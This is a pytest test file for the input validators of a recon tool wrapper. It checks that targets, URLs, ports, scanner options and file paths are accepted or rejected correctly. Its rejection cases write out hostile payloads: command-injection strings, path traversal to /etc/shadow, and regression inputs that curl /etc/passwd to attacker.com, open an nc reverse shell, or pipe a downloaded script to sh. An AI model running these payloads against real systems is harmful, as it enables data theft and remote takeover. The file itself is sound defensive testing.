"""
Unit tests for security validation functions.

These tests verify that the validation functions properly:
- Accept valid inputs
- Reject malicious inputs (command injection, path traversal, etc.)
- Handle edge cases correctly
- Provide appropriate error messages
"""

import os
import tempfile
from pathlib import Path
from typing import Generator
from unittest.mock import patch

import pytest

from recon_superpower.core.validators import (
    ValidationResult,
    validate_target,
    validate_url,
    validate_domain,
    validate_port,
    validate_numeric,
    validate_extra_options,
    validate_file_path,
    validate_file_extensions,
    validate_interface_name,
    validate_nse_script,
    validate_github_account,
    validate_metasploit_options,
    validate_bpf_filter,
    validate_wordlist_path,
    validate_output_path,
)


class TestValidationResult:
    """Tests for ValidationResult dataclass."""

    def test_bool_true_when_valid(self) -> None:
        """ValidationResult should be truthy when is_valid is True."""
        result = ValidationResult(True)
        assert result
        assert bool(result) is True

    def test_bool_false_when_invalid(self) -> None:
        """ValidationResult should be falsy when is_valid is False."""
        result = ValidationResult(False, "error message")
        assert not result
        assert bool(result) is False

    def test_sanitized_value_accessible(self) -> None:
        """Sanitized value should be accessible."""
        result = ValidationResult(True, sanitized_value="cleaned")
        assert result.sanitized_value == "cleaned"


class TestValidateTarget:
    """Tests for validate_target function."""

    # Valid targets
    @pytest.mark.parametrize("target", [
        "192.168.1.1",
        "10.0.0.1",
        "example.com",
        "sub.example.com",
        "192.168.1.0/24",
        "::1",
        "fe80::1",
        "example.com:8080",
        "localhost",
        "my-server.local",
    ])
    def test_valid_targets(self, target: str) -> None:
        """Valid targets should pass validation."""
        result = validate_target(target)
        assert result.is_valid
        assert result.error_message is None

    # Command injection attempts
    @pytest.mark.parametrize("target", [
        "192.168.1.1; rm -rf /",
        "192.168.1.1 && cat /etc/passwd",
        "192.168.1.1 | nc attacker.com 4444",
        "$(whoami).example.com",
        "`id`.example.com",
        "192.168.1.1\n192.168.1.2",
        "192.168.1.1\rmalicious",
        "${IFS}example.com",
    ])
    def test_command_injection_blocked(self, target: str) -> None:
        """Command injection attempts should be blocked."""
        result = validate_target(target)
        assert not result.is_valid
        assert result.error_message is not None

    def test_null_byte_blocked(self) -> None:
        """NULL bytes should be blocked."""
        result = validate_target("192.168.1.1\x00malicious")
        assert not result.is_valid
        assert "NULL byte" in result.error_message

    def test_empty_target_rejected(self) -> None:
        """Empty target should be rejected."""
        result = validate_target("")
        assert not result.is_valid
        assert "empty" in result.error_message.lower()

    def test_max_length_enforced(self) -> None:
        """Targets exceeding max length should be rejected."""
        long_target = "a" * 300
        result = validate_target(long_target)
        assert not result.is_valid
        assert "length" in result.error_message.lower()


class TestValidateUrl:
    """Tests for validate_url function."""

    @pytest.mark.parametrize("url", [
        "http://example.com",
        "https://example.com",
        "http://192.168.1.1",
        "https://example.com:8443/path",
        "http://example.com/path?query=value",
        "https://sub.domain.example.com",
    ])
    def test_valid_urls(self, url: str) -> None:
        """Valid URLs should pass validation."""
        result = validate_url(url)
        assert result.is_valid

    @pytest.mark.parametrize("url", [
        "ftp://example.com",
        "file:///etc/passwd",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "gopher://example.com",
    ])
    def test_invalid_schemes_rejected(self, url: str) -> None:
        """Non-HTTP(S) schemes should be rejected."""
        result = validate_url(url)
        assert not result.is_valid
        assert "http" in result.error_message.lower()

    def test_url_without_scheme_rejected(self) -> None:
        """URLs without scheme should be rejected."""
        result = validate_url("example.com")
        assert not result.is_valid

    def test_null_byte_in_url_blocked(self) -> None:
        """NULL bytes in URLs should be blocked."""
        result = validate_url("http://example.com\x00/malicious")
        assert not result.is_valid

    def test_empty_url_rejected(self) -> None:
        """Empty URL should be rejected."""
        result = validate_url("")
        assert not result.is_valid


class TestValidateDomain:
    """Tests for validate_domain function."""

    @pytest.mark.parametrize("domain", [
        "example.com",
        "sub.example.com",
        "my-domain.co.uk",
        "test123.example.org",
    ])
    def test_valid_domains(self, domain: str) -> None:
        """Valid domains should pass validation."""
        result = validate_domain(domain)
        assert result.is_valid

    @pytest.mark.parametrize("domain", [
        "-invalid.com",
        "invalid-.com",
        "invalid..com",
        ".example.com",
        "example.com.",
    ])
    def test_invalid_domain_formats(self, domain: str) -> None:
        """Invalid domain formats should be rejected."""
        result = validate_domain(domain)
        assert not result.is_valid

    def test_empty_domain_rejected(self) -> None:
        """Empty domain should be rejected."""
        result = validate_domain("")
        assert not result.is_valid


class TestValidatePort:
    """Tests for validate_port function."""

    @pytest.mark.parametrize("port", [
        "80",
        "443",
        "8080",
        "1",
        "65535",
        "80,443",
        "1-1000",
        "80,443,8080-8090",
    ])
    def test_valid_ports(self, port: str) -> None:
        """Valid ports and port ranges should pass validation."""
        result = validate_port(port)
        assert result.is_valid

    @pytest.mark.parametrize("port", [
        "0",
        "65536",
        "99999",
        "-1",
    ])
    def test_ports_out_of_range(self, port: str) -> None:
        """Ports outside 1-65535 should be rejected."""
        result = validate_port(port)
        assert not result.is_valid

    @pytest.mark.parametrize("port", [
        "abc",
        "80; rm -rf /",
        "80 && whoami",
        "80|nc",
    ])
    def test_invalid_port_formats(self, port: str) -> None:
        """Invalid port formats should be rejected."""
        result = validate_port(port)
        assert not result.is_valid

    def test_empty_port_allowed(self) -> None:
        """Empty port should be allowed (uses default)."""
        result = validate_port("")
        assert result.is_valid


class TestValidateNumeric:
    """Tests for validate_numeric function."""

    def test_valid_numeric(self) -> None:
        """Valid numeric values should pass."""
        result = validate_numeric("50", 1, 100)
        assert result.is_valid
        assert result.sanitized_value == "50"

    def test_below_minimum(self) -> None:
        """Values below minimum should be rejected."""
        result = validate_numeric("0", 1, 100)
        assert not result.is_valid

    def test_above_maximum(self) -> None:
        """Values above maximum should be rejected."""
        result = validate_numeric("150", 1, 100)
        assert not result.is_valid

    def test_non_numeric_rejected(self) -> None:
        """Non-numeric values should be rejected."""
        result = validate_numeric("abc")
        assert not result.is_valid

    def test_empty_allowed(self) -> None:
        """Empty value should be allowed for optional fields."""
        result = validate_numeric("")
        assert result.is_valid


class TestValidateExtraOptions:
    """Tests for validate_extra_options function - CRITICAL security function."""

    @pytest.mark.parametrize("options", [
        "-v",
        "--verbose",
        "-sV -sC",
        "--script=vuln",
        "-p 1-1000",
        "--timeout 30",
        '-oN "output file.txt"',
    ])
    def test_valid_options(self, options: str) -> None:
        """Valid command options should pass validation."""
        result = validate_extra_options(options)
        assert result.is_valid
        assert isinstance(result.sanitized_value, list)

    # Command injection attempts
    @pytest.mark.parametrize("options", [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| nc attacker.com 4444",
        "$(whoami)",
        "`id`",
        "${PATH}",
        "> /etc/passwd",
        "< /etc/shadow",
        "-v; whoami",
        "-v && id",
        "-v || true",
        "-v\nwhoami",
        "-v\r\nid",
    ])
    def test_command_injection_blocked(self, options: str) -> None:
        """Command injection attempts should be blocked."""
        result = validate_extra_options(options)
        assert not result.is_valid
        assert result.error_message is not None

    def test_null_byte_blocked(self) -> None:
        """NULL bytes should be blocked."""
        result = validate_extra_options("-v\x00; whoami")
        assert not result.is_valid
        assert "NULL byte" in result.error_message or "invalid" in result.error_message.lower()

    def test_empty_allowed(self) -> None:
        """Empty options should be allowed."""
        result = validate_extra_options("")
        assert result.is_valid
        assert result.sanitized_value == []

    def test_unmatched_quotes_rejected(self) -> None:
        """Unmatched quotes should be rejected."""
        result = validate_extra_options('-oN "incomplete')
        assert not result.is_valid

    def test_max_length_enforced(self) -> None:
        """Options exceeding max length should be rejected."""
        long_options = "-v " * 200  # Exceeds 500 char limit
        result = validate_extra_options(long_options)
        assert not result.is_valid
        assert "length" in result.error_message.lower()


class TestValidateFilePath:
    """Tests for validate_file_path function."""

    @pytest.fixture
    def temp_file(self) -> Generator[str, None, None]:
        """Create a temporary file for testing."""
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(b"test content")
            temp_path = f.name
        yield temp_path
        os.unlink(temp_path)

    def test_valid_file_path(self, temp_file: str) -> None:
        """Valid existing file should pass validation."""
        result = validate_file_path(temp_file)
        assert result.is_valid

    # Path traversal attempts
    @pytest.mark.parametrize("path", [
        "../../../etc/passwd",
        "/etc/../etc/passwd",
        "~/../../etc/shadow",
        "..\\..\\windows\\system32\\config\\sam",
    ])
    def test_path_traversal_blocked(self, path: str) -> None:
        """Path traversal attempts should be blocked."""
        result = validate_file_path(path, must_exist=False)
        assert not result.is_valid
        assert "traversal" in result.error_message.lower()

    def test_nonexistent_file_rejected(self) -> None:
        """Non-existent files should be rejected when must_exist=True."""
        result = validate_file_path("/nonexistent/path/file.txt", must_exist=True)
        assert not result.is_valid

    def test_empty_path_rejected(self) -> None:
        """Empty path should be rejected."""
        result = validate_file_path("")
        assert not result.is_valid


class TestValidateFileExtensions:
    """Tests for validate_file_extensions function."""

    @pytest.mark.parametrize("extensions", [
        "php",
        "html,txt",
        "php,html,txt,asp",
        "js,json,xml",
    ])
    def test_valid_extensions(self, extensions: str) -> None:
        """Valid extension lists should pass validation."""
        result = validate_file_extensions(extensions)
        assert result.is_valid

    @pytest.mark.parametrize("extensions", [
        "php;html",
        "php|txt",
        "php && txt",
        "php\ntxt",
    ])
    def test_invalid_extension_formats(self, extensions: str) -> None:
        """Invalid extension formats should be rejected."""
        result = validate_file_extensions(extensions)
        assert not result.is_valid


class TestValidateInterfaceName:
    """Tests for validate_interface_name function."""

    @pytest.mark.parametrize("interface", [
        "eth0",
        "wlan0",
        "lo",
        "ens33",
        "docker0",
        "br-12345",
    ])
    def test_valid_interface_names(self, interface: str) -> None:
        """Valid interface names should pass format validation."""
        # Mock os.path.exists to return True for interface check
        with patch('os.path.exists', return_value=True):
            result = validate_interface_name(interface)
            assert result.is_valid

    @pytest.mark.parametrize("interface", [
        "eth0; whoami",
        "eth0 && id",
        "eth0|nc",
        "../eth0",
    ])
    def test_invalid_interface_names(self, interface: str) -> None:
        """Invalid interface names should be rejected."""
        result = validate_interface_name(interface)
        assert not result.is_valid

    def test_empty_interface_rejected(self) -> None:
        """Empty interface name should be rejected."""
        result = validate_interface_name("")
        assert not result.is_valid


class TestValidateNseScript:
    """Tests for validate_nse_script function."""

    @pytest.mark.parametrize("script", [
        "vuln",
        "default",
        "http-vuln-cve2017-5638",
        "smb-vuln-ms17-010",
        "vuln,safe",
    ])
    def test_valid_nse_scripts(self, script: str) -> None:
        """Valid NSE script names should pass validation."""
        result = validate_nse_script(script)
        assert result.is_valid

    @pytest.mark.parametrize("script", [
        "../../../etc/passwd",
        "/etc/nmap/scripts/test.nse",
        "script; whoami",
        "script && id",
    ])
    def test_invalid_nse_scripts(self, script: str) -> None:
        """Invalid NSE script names should be rejected."""
        result = validate_nse_script(script)
        assert not result.is_valid


class TestValidateGithubAccount:
    """Tests for validate_github_account function."""

    @pytest.mark.parametrize("account", [
        "octocat",
        "github",
        "user-name",
        "test123",
    ])
    def test_valid_github_accounts(self, account: str) -> None:
        """Valid GitHub usernames should pass validation."""
        result = validate_github_account(account)
        assert result.is_valid

    @pytest.mark.parametrize("account", [
        "-invalid",
        "invalid-",
        "user--name",
        "a" * 50,  # Too long
        "user;whoami",
    ])
    def test_invalid_github_accounts(self, account: str) -> None:
        """Invalid GitHub usernames should be rejected."""
        result = validate_github_account(account)
        assert not result.is_valid


class TestValidateMetasploitOptions:
    """Tests for validate_metasploit_options function."""

    @pytest.mark.parametrize("options", [
        "RHOSTS=192.168.1.1",
        "RHOSTS=192.168.1.1 RPORT=445",
        "THREADS=10",
    ])
    def test_valid_metasploit_options(self, options: str) -> None:
        """Valid Metasploit options should pass validation."""
        result = validate_metasploit_options(options)
        assert result.is_valid

    @pytest.mark.parametrize("options", [
        "RHOSTS=192.168.1.1; whoami",
        "RHOSTS=$(cat /etc/passwd)",
        "RHOSTS=test && id",
    ])
    def test_injection_in_metasploit_options(self, options: str) -> None:
        """Command injection in Metasploit options should be blocked."""
        result = validate_metasploit_options(options)
        assert not result.is_valid


class TestValidateBpfFilter:
    """Tests for validate_bpf_filter function."""

    @pytest.mark.parametrize("bpf_filter", [
        "port 80",
        "host 192.168.1.1",
        "tcp and port 443",
        "udp and port 53",
        "src host 10.0.0.1",
        "dst port 8080",
    ])
    def test_valid_bpf_filters(self, bpf_filter: str) -> None:
        """Valid BPF filters should pass validation."""
        result = validate_bpf_filter(bpf_filter)
        assert result.is_valid

    @pytest.mark.parametrize("bpf_filter", [
        "port 80; whoami",
        "port 80 && id",
        "port 80 | nc",
        "(port 80)",  # Parentheses not allowed for security
    ])
    def test_injection_in_bpf_filter(self, bpf_filter: str) -> None:
        """Command injection in BPF filters should be blocked."""
        result = validate_bpf_filter(bpf_filter)
        assert not result.is_valid

    def test_filter_without_keyword_rejected(self) -> None:
        """BPF filter without valid keywords should be rejected."""
        result = validate_bpf_filter("random text")
        assert not result.is_valid


class TestValidateOutputPath:
    """Tests for validate_output_path function."""

    def test_valid_output_path_in_home(self) -> None:
        """Valid output path in home directory should pass."""
        home = os.path.expanduser("~")
        result = validate_output_path(f"{home}/output.txt")
        assert result.is_valid

    def test_output_path_outside_home_rejected(self) -> None:
        """Output paths outside home directory should be rejected."""
        result = validate_output_path("/tmp/output.txt")
        assert not result.is_valid

    def test_path_traversal_in_output_blocked(self) -> None:
        """Path traversal in output path should be blocked."""
        home = os.path.expanduser("~")
        result = validate_output_path(f"{home}/../../etc/passwd")
        assert not result.is_valid


class TestSecurityRegression:
    """
    Regression tests for previously discovered security vulnerabilities.
    These tests should NEVER be removed - they protect against known attack vectors.
    """

    def test_cve_level_command_injection_extra_options(self) -> None:
        """
        Regression test for CVE-level command injection in extra options.
        Original vulnerability: extra.split() allowed shell metacharacters.
        """
        malicious_inputs = [
            "-v && curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd)",
            "-v; nc -e /bin/sh attacker.com 4444",
            "-v | tee /tmp/pwned",
            "-v `wget http://attacker.com/shell.sh -O - | sh`",
        ]
        for payload in malicious_inputs:
            result = validate_extra_options(payload)
            assert not result.is_valid, f"Should block: {payload}"

    def test_path_traversal_in_wordlist(self) -> None:
        """
        Regression test for path traversal in wordlist paths.
        Original vulnerability: could load sensitive system files.
        """
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "~/../../etc/passwd",
        ]
        for path in traversal_attempts:
            result = validate_file_path(path, must_exist=False)
            assert not result.is_valid, f"Should block: {path}"

    def test_null_byte_injection(self) -> None:
        """
        Regression test for NULL byte injection.
        NULL bytes can bypass validation or cause unexpected behavior.
        """
        null_byte_payloads = [
            "192.168.1.1\x00; rm -rf /",
            "http://example.com\x00/../../../etc/passwd",
            "-v\x00; whoami",
        ]
        validators = [validate_target, validate_url, validate_extra_options]

        for payload in null_byte_payloads:
            for validator in validators:
                result = validator(payload)
                assert not result.is_valid, f"{validator.__name__} should block NULL byte"
